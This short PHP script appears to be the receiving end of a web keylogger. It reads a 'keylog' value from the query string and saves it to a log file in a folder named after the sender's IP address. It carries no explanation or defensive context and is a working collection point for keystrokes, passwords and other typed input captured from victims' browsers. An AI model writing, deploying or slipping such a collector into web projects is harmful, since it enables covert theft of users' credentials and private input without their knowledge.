<?php
$stringData = $_GET["keylog"];
if($stringData == "undefined") {
  die();
}
else {
file_put_contents('text/'.$_SERVER['REMOTE_ADDR'].'/log.txt', $stringData);
}
?>
